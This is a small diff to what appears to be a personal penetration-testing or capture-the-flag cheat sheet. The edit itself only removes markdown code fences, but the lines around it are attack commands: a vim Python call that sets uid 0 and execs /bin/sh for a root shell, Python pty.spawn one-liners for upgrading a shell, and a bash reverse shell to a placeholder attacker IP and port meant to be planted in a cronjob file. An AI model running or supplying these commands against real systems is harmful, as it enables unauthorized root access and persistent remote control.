@@ -27,12 +27,11 @@ vim capabilities to spawn a root shell:
 ./vim -c ' :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
 
 upgrading python shell:
-
-```python -c 'import pty;pty.spawn("bin/bash")'
+python -c 'import pty;pty.spawn("bin/bash")'
 python2 -c 'import pty;pty.spawn("bin/bash")'
 python3 -c 'import pty;pty.spawn("bin/bash")'
 export TERM=xterm
-```
+
 spawn a reverse shell inside a cronjob file:
 
 bash -i >& /dev/tcp/<AM_IP>/<AM_port> 0>&1
